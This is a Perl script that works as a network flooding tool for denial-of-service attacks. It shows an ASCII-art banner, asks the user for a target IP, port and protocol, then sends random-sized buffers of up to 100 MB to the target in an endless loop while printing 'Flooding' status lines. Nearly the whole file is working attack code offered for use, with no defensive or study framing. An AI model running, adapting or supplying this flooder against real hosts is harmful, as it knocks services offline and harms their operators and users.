#!/usr/bin/perl
use IO::Socket;
use Scalar::Util qw(looks_like_number);

system("cls || clear");

print q{ 
                   .-"      "-.  
                  /            \ 
                 |     Zix   | 
                 |,  .-.  .-.  ,| 
                 | )(__/  \__)( | 
                 |/     /\     \| 
       (@_       (_     ^^     _) 
  _     ) \_______\__|IIIIII|__/__________________________ 
 (_)@8@8{}<________|-\IIIIII/-|_O_M_A_I_S_B_R_A_B_O_k_k_j_> 
        )_/        \          / 
       (@           `--------` Salve! 

 [---]   by:> Zix The Redencion   [---]
};

# Check Internet Connection
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 'PeerPort'=>80, 'Timeout'=>2, 'proto'=>'tcp');
if (!(defined $check && $check)) {
    print("[-] Internet Status[ Not Connected ]");
    print("\n[!] Error: Please Check Your Internet Connection !!!");
    exit(1);
}
$check->close();

print "\n===============================";
print "\n[~] Enter TargetIP: ";
$host = <STDIN>;
chomp($host);
while ($host eq "") {
    print "   [!] Enter TargetIP?: ";
    $host = <STDIN>;
    chomp($host);
}
print "TARGET ==> $host";

print "\n===============================";
print "\n[~] Enter Port: ";
$port = <STDIN>;
chomp($port);
while ($port eq "" || !looks_like_number($port) || !grep { $port eq $_ } (0..65535)) {
    print "   [!] Enter PORT?: ";
    $port = <STDIN>;
    chomp($port);
}
print "PORT ==> $port";

print "\n===============================";
print "\n[~] Enter Protocol (TCP or UDP): ";
$proto = <STDIN>;
chomp($proto);
while ($proto eq "" || !grep { lc($proto) eq lc($_) } ('TCP','UDP')) {
    print "   [!] Enter Protocol (TCP or UDP) ?: ";
    $proto = <STDIN>;
    chomp($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
    PeerAddr => $host,
    PeerPort => $port,
    Proto    => "$proto"
) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";

system("clear || cls");
print "\n[*] Attack Started on [$host:$port] proto => [$proto]...\n\n";
sleep(1);

while (1) {
    if (lc($proto) eq 'tcp') {
        $sock = IO::Socket::INET->new(
            PeerAddr => $host,
            PeerPort => $port,
            Proto    => "$proto"
        ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n";

        for ($i = 0; $i <= 500; $i++) {
            my $size = int(rand(1024 * 1024 * 100)); # até 100MB
            print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
            my $data = 'A' x $size;
            send($sock, $data, 0);
        }

    } else {
        my $size = int(rand(1024 * 1024 * 100)); # até 100MB
        print ("Flooding: (=>$host:$port~$proto<=) Packet size: $size bytes\n");
        my $data = 'A' x $size;
        send($sock, $data, 0);
    }
}
$sock->close();